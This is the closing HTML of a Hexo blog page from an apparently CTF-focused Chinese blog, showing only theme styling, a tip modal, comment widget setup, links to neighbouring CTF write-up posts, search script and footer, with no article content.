        -webkit-transform:scale(1.3);
        -o-transform:scale(1.3);
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-content ul {
        padding-left: 0 !important;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        background-color: #ccc;
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff !important;
        background-color: #22AB38 !important;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff !important;
        background-color: #019FE8 !important;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">你的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    

    
        <style>
    .valine-card {
        margin: 1.5rem auto;
    }

    .valine-card .card-content {
        padding: 20px 20px 5px 20px;
    }

    #vcomments textarea {
        box-sizing: border-box;
        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
    }

    #vcomments p {
        margin: 2px 2px 10px;
        font-size: 1.05rem;
        line-height: 1.78rem;
    }

    #vcomments blockquote p {
        text-indent: 0.2rem;
    }

    #vcomments a {
        padding: 0 2px;
        color: #4cbf30;
        font-weight: 500;
        text-decoration: none;
    }

    #vcomments img {
        max-width: 100%;
        height: auto;
        cursor: pointer;
    }

    #vcomments ol li {
        list-style-type: decimal;
    }

    #vcomments ol,
    ul {
        display: block;
        padding-left: 2em;
        word-spacing: 0.05rem;
    }

    #vcomments ul li,
    ol li {
        display: list-item;
        line-height: 1.8rem;
        font-size: 1rem;
    }

    #vcomments ul li {
        list-style-type: disc;
    }

    #vcomments ul ul li {
        list-style-type: circle;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    #vcomments table, th, td {
        border: 0;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments h1 {
        font-size: 1.85rem;
        font-weight: bold;
        line-height: 2.2rem;
    }

    #vcomments h2 {
        font-size: 1.65rem;
        font-weight: bold;
        line-height: 1.9rem;
    }

    #vcomments h3 {
        font-size: 1.45rem;
        font-weight: bold;
        line-height: 1.7rem;
    }

    #vcomments h4 {
        font-size: 1.25rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    #vcomments h5 {
        font-size: 1.1rem;
        font-weight: bold;
        line-height: 1.4rem;
    }

    #vcomments h6 {
        font-size: 1rem;
        line-height: 1.3rem;
    }

    #vcomments p {
        font-size: 1rem;
        line-height: 1.5rem;
    }

    #vcomments hr {
        margin: 12px 0;
        border: 0;
        border-top: 1px solid #ccc;
    }

    #vcomments blockquote {
        margin: 15px 0;
        border-left: 5px solid #42b983;
        padding: 1rem 0.8rem 0.3rem 0.8rem;
        color: #666;
        background-color: rgba(66, 185, 131, .1);
    }

    #vcomments pre {
        font-family: monospace, monospace;
        padding: 1.2em;
        margin: .5em 0;
        background: #272822;
        overflow: auto;
        border-radius: 0.3em;
        tab-size: 4;
    }

    #vcomments code {
        font-family: monospace, monospace;
        padding: 1px 3px;
        font-size: 0.92rem;
        color: #e96900;
        background-color: #f8f8f8;
        border-radius: 2px;
    }

    #vcomments pre code {
        font-family: monospace, monospace;
        padding: 0;
        color: #e8eaf6;
        background-color: #272822;
    }

    #vcomments pre[class*="language-"] {
        padding: 1.2em;
        margin: .5em 0;
    }

    #vcomments code[class*="language-"],
    pre[class*="language-"] {
        color: #e8eaf6;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }

    #vcomments b,
    strong {
        font-weight: bold;
    }

    #vcomments dfn {
        font-style: italic;
    }

    #vcomments small {
        font-size: 85%;
    }

    #vcomments cite {
        font-style: normal;
    }

    #vcomments mark {
        background-color: #fcf8e3;
        padding: .2em;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }
</style>

<div class="card valine-card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>评论</span>
    </div>
    <div id="vcomments" class="card-content" style="display: grid">
    </div>
</div>

<script src="/libs/valine/av-min.js"></script>
<script src="/libs/valine/Valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        appId: 'T5NQswoTdP1lIQoMWGjuCIW8-gzGzoHsz',
        appKey: 'Plcqv1j5VkAV6ByH7KDT6HFB',
        notify: 'true' === 'true',
        verify: 'true' === 'true',
        visitor: 'true' === 'true',
        avatar: 'xiaoxin',
        pageSize: '10',
        lang: 'zh-cn',
        placeholder: '欢迎师傅斧正'
    });
</script>

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2020/11/15/gwctf2019/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="GWCTF2019 web wp">
                        
                        <span class="card-title">GWCTF2019 web wp</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
[GWCTF 2019]我有一个数据库
[GWCTF 2019]枯燥的抽奖
[GWCTF 2019]mypassword
[GWCTF 2019]你的名字
[GWCTF 2019]blog


                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2020-11-15
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/CTF%E5%88%B7%E9%A2%98/" class="post-category">
                                    CTF刷题
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/">
                        <span class="chip bg-color">...</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2020/10/30/xctf-web-jin-jie/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="XCTF web进阶">
                        
                        <span class="card-title">XCTF web进阶</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
web2


                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2020-10-30
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/CTF%E5%88%B7%E9%A2%98/" class="post-category">
                                    CTF刷题
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>


<script>
    $('#articleContent').on('copy', function (e) {
        // IE8 or earlier browser is 'undefined'
        if (typeof window.getSelection === 'undefined') return;

        var selection = window.getSelection();
        // if the selection is short let's not annoy our users.
        if (('' + selection).length < Number.parseInt('120')) {
            return;
        }

        // create a div outside of the visible area and fill it with the selected text.
        var bodyElement = document.getElementsByTagName('body')[0];
        var newdiv = document.createElement('div');
        newdiv.style.position = 'absolute';
        newdiv.style.left = '-99999px';
        bodyElement.appendChild(newdiv);
        newdiv.appendChild(selection.getRangeAt(0).cloneContents());

        // we need a <pre> tag workaround.
        // otherwise the text inside "pre" loses all the line breaks!
        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
        }

        var url = document.location.href;
        newdiv.innerHTML += '<br />'
            + '来源: 会下雪的晴天<br />'
            + '文章作者: yq1ng<br />'
            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';

        selection.selectAllChildren(newdiv);
        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
    });
</script>


<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h1, h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h1, h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
    <div class="container row center-align" style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2022</span>
            
            <span id="year">2019</span>
            <a href="/about" target="_blank">yq1ng</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                class="white-color">189.8k</span>&nbsp;字
            
            
            
            
            
            
            <span id="busuanzi_container_site_pv">
                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                    class="white-color"></span>&nbsp;次
            </span>
            
            
            <span id="busuanzi_container_site_uv">
                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
                    class="white-color"></span>&nbsp;人
            </span>
            
            <br>
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/yq1ng" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:1578422748@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1578422748" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1578422748" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>
<a onclick="switchNightMode()" id="sma" title="模式切换">
    <i class="fa fa-moon-o" id="nightMode" aria-hidden="true"></i>
</a>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

	
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
